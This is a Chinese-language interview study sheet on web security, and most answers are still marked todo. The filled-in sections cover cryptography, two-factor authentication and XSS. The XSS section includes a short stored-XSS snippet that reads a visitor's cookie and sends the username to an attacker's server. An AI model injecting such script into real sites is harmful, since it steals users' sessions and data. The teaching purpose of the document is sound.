1. [什么是代码安全？在你的观点中，这个是开发者的责任，还是公司需要专门的角色？](#1-shen-me-shi-dai-ma-an-quan-zai-ni-de-guan-dian-zhong-zhe-ge-shi-kai-fa-zhe-de-ze-ren-hai-shi-gong-si-xu-yao-zhuan-men-de-jiao-se)
2. [为什么密码学是一些你自己不需要重新发明和设计的事情？](#2-wei-shen-me-mi-ma-xue-shi-yi-xie-ni-zi-ji-bu-xu-yao-zhong-xin-fa-ming-he-she-ji-de-shi-qing)
3. [什么是双因素认证(Two Factor Authentication)？在一个已有的Web应用中，你如何实现这种机制？](#3-shen-me-shi-shuang-yin-su-ren-zheng-two-factor-authentication-zai-yi-ge-yi-you-de-web-ying-yong-zhong-ni-ru-he-shi-xian-zhe-zhong-ji-zhi)
4. [如果不是仔细处理，存在日志中包含敏感信息的风险，比如密码？如何处理这些事情呢？](#4-ru-guo-bu-shi-zai-xi-chu-li-cun-zai-ri-zhi-zhong-bao-han-min-gan-xin-xi-de-feng-xian-bi-ru-mi-ma-ru-he-chu-li-zhe-xie-shi-qing-ne)
5. [编写代码能够被SQL注入影响，并修改它；](#5-bian-xie-dai-ma-neng-gou-bei-sql-zhu-ru-ying-xiang-bing-xiu-gai-ta)
6. [能够通过代码静态检查分析来检测SQL注入，能够给出大致的思路；](#6-neng-gou-tong-guo-dai-ma-jing-tai-jian-cha-fen-xi-lai-jian-ce-sql-zhu-ru-neng-gou-gei-chu-da-zhi-de-si-lu)
7. [什么是 Cross-Site Scripting?](#7-shen-me-shi-crosssite-scripting)
8. [什么是Cross-Site Forgery Attack?](#8-shen-me-shi-crosssite-forgery-attack)
9. [HTTPS是如何工作的？](#9-https-shi-ru-he-gong-zuo-de)
10. [什么是中间人攻击（Man-in-the-middle Attack)? HTTPS如何保护的？](#10-shen-me-shi-zhong-jian-ren-gong-ji-maninthemiddle-attack-https-ru-he-bao-hu-de)
11. [怎样防止用户的会话（session）被偷？](#11-zen-yang-fang-zhi-yong-hu-de-hui-hua-session-bei-tou)


## 1 什么是代码安全？在你的观点中，这个是开发者的责任，还是公司需要专门的角色？
*todo*
## 2 为什么密码学是一些你自己不需要重新发明和设计的事情？
首先实现一套加密系统是非常困难的一件事，连这个领域的专家通常也会在这个领域出错，不管是理论还是实践中。除此之外，选择已经有的加密系统，也就意味着这个理论已经被社区广泛测试过了，而且已经有大量的系统已经支持这个加密算法。
所以你不需要设计一个密码系统除非你是靠着谋生或者能够接受社区的挑战，这是一个专业人士的课题。如果仅仅是为了挑战加密算法，也就仅仅适用于实验项目而不能用在生产中。


## 3 什么是双因素认证(Two Factor Authentication)？在一个已有的Web应用中，你如何实现这种机制？
双因素认证也叫做两步验证，这是一种安全认证过程这样用户可以提两种不同的认证因素来验证用户身份。这个方式比传统的单因素，比如用户名和密码安全得多。双因素认证的过程是这样的，当你需要访问敏感数据来源的的时候，除了需要输入用户名和密码之外，还需要提供第二种认证输入，比如秘钥或者生物特征因素。
对于认证因素，主要有以下几种：

1. 认知认证：这是用户已知的信息，比如密码，PIN(个人身份号码)，
2. 拥有认证：比如以下 ID 卡，安全 token，手机，移动设备或者只能手机的 app，
3. 生物认证：比如用户身体指纹，视网膜等等，
4. 位置认证：尝试授权的设备需要在特定的位置范围，
5. 时间认证：授权只允许在特定的时间窗口内完成

那么双因素认证的过程是怎样的呢?

1. 用户在应用程序后者网站被提示登录
2. 用户输入用户名和密码
3. 网站或者应用程序提示进行第二部验证，在这一步可以选择多个认证方式，比如安全 Token, ID 卡等等
4. 在第三步中，用户输入上一步实时生成的代码
5. 如果提供了两步认证，用户被授权访问敏感数据

## 4 如果不是仔细处理，存在日志中包含敏感信息的风险，比如密码？如何处理这些事情呢？
*todo*
## 5 编写代码能够被SQL注入影响，并修改它；
*todo*
## 6 能够通过代码静态检查分析来检测SQL注入，能够给出大致的思路；
*todo*
## 7 什么是 Cross-Site Scripting?
Cross-Site Scripting 也叫做 XSS ，它允许攻击者将客户端代码侵入到用户的的浏览的页面中。为什么它可以做到这一点呢？因为它绕过了同源策略（Same Origin Policy)。

所谓同源策略也就是说浏览器针对同一个站点的内容都授予权限来访问资源，比如说 cookie 什么的。如果网站内容下面三者相同，就表明是同源的
1. URI schema 相同
2. host 名相同
3. port 相同

攻击者将有问题的脚本（一般为代码）通过安全的网站分发给浏览这个网站的用户，由于脚本现在属于同源的内容，因此有权限访问一些敏感的数据，并且将它们发送给攻击者，这样完成了数据窃取。
假设现在有一个相亲网站，你是其中的一名会员，不过你想知道有哪些人访问了你的主页。你可以在自我介绍的的输入框的最后，添加上这么一段代码
```js
<script> 
let cookie = document.cookie;
let userName = getUsername("https://www.binddate.com", cookie);
sendUserNameToMyServer("https://www.myserver.com", userName);
</script>
```

这样在别的会员在用浏览器加载你的主页的时候，你的自我介绍就会被从数据库中加载到用户的浏览器中。但是最后的 `script` 标签会被浏览器执行，由于是同源上的内容，所以正在浏览的用户的 cookie 就会被访问，进而读取到用户的姓名，完成了数据的窃取。

XSS 主要分为四种
1. Reflected. 这是大部分 XSS 的类型，它是由客户端提供的内容导致的。一般的搜索或者提交的 Web 应用都会返回用户的输入。如果用户的提交的的内容是攻击的代码，那么就可能导致问题的出现。
2. Stored: 这种类型是用户的攻击的代码存储在数据库中，而且能够将这个脚本发送给所有正常的页面。比如上面的例子就是这种类型。
3. Server-side versus DOM-based vulnerabilities: 这是将渲染和业务逻辑放置在客户端引出的 XSS 攻击
4. Mutated: 这是一种看上去安全的内容，但是但是它能够通过浏览器重写，修改和解析标记文本，比如少些一个闭合的方括号。

既然出现了 XSS 的攻击，就有办法阻止这种攻击

- [XSS 检查清单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOM 类型检查清单](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [代码 Review 注意事项](https://owasp.org/www-project-code-review-guide/migrated_content)
## 8 什么是Cross-Site Forgery Attack?
*todo*
## 9 HTTPS是如何工作的？
*todo*
## 10 什么是中间人攻击（Man-in-the-middle Attack)? HTTPS如何保护的？
*todo*
## 11 怎样防止用户的会话（session）被偷？
*todo*